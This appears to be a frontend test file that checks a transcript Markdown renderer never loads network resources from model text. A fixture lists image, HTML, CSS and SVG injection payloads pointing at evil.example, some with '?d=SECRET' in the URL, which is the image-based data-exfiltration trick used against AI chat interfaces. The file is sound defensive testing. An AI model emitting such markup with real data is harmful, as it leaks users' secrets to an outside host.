// Model text must not load anything by itself: no images, no raw HTML, in static and streaming mode.
import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { Markdown } from "@/components/transcript/item";

const HOSTILE = [
  "Смотри: ![график](https://evil.example/b.png?d=SECRET)",
  '<img src="https://evil.example/a.png?d=SECRET">',
  '<link rel="preload" as="image" href="https://evil.example/c.png">',
  '<iframe src="https://evil.example/frame"></iframe>',
  "<style>body{background:url(https://evil.example/s.png)}</style>",
  '<video src="https://evil.example/v.mp4" autoplay></video>',
  '<svg><image href="https://evil.example/i.png"/></svg>',
  "[![x](https://evil.example/in-link.png)](https://evil.example/)",
  '<div style="background:url(https://evil.example/d.png)">fake card</div>',
].join("\n\n");

describe.each([false, true])("Markdown (streaming: %s)", (streaming) => {
  it("renders no element that loads from the network", async () => {
    const { container, findAllByTestId } = render(<Markdown text={HOSTILE} streaming={streaming} />);
    await findAllByTestId("image-as-text");
    for (const tag of ["img", "link", "iframe", "style", "video", "audio", "svg", "image", "object", "embed", "source", "script"]) {
      expect(container.querySelectorAll(tag), tag).toHaveLength(0);
    }
    expect(container.querySelectorAll("[style*='url(']")).toHaveLength(0);
    // raw HTML may appear as escaped text; no element may carry a loading attribute
    expect(container.querySelectorAll("[src], [srcset], [poster], [background], [data]")).toHaveLength(0);
  });

  it("shows an image as its alt and URL, as text", async () => {
    const { findAllByTestId } = render(<Markdown text="![график](https://evil.example/b.png?d=SECRET)" streaming={streaming} />);
    const [image] = await findAllByTestId("image-as-text");
    expect(image!.textContent).toBe("[изображение: график] https://evil.example/b.png?d=SECRET");
    expect(image!.closest("a")).toBeNull();
  });

  it("still renders ordinary markdown", async () => {
    const { findByText } = render(<Markdown text={"**жирный** и `код`"} streaming={streaming} />);
    expect((await findByText("жирный")).tagName).toMatch(/STRONG|SPAN/);
  });
});
